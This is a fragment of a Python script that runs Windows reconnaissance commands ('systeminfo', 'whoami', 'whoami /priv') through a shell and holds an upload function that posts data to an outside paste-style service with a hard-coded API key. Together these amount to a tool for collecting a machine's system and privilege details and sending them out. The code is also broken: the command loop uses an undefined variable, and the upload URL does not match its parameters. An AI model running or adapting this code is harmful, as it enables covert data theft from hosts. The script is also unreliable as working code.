import os
import requests
import subprocess
import sys
import base64

def upload(data):

    link = 'https://api.imgbb.com/1/upload'

    api_info={
        'api_dev_key' : 'e64330232e81c859b80df1d6840e17a0',
        'api_paste_code' : data,
        'api_paste_name' : "result",
        'api_option' : 'paste'
    }

    try:
        req = requests.post(link,data=api_info)
        print(req.text)
    except:
        print(Exception)

def command():
    run = ["systeminfo","whoami","whoami /priv"]
    res = []

    for a in run:
        tp = subprocess.Popen(args=x,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        
        str,error=tp.communicate()

        if error !=b'':
            res.append(a)
            res.append(error.decode())
        else:
            res.append(str.decode())
    
    
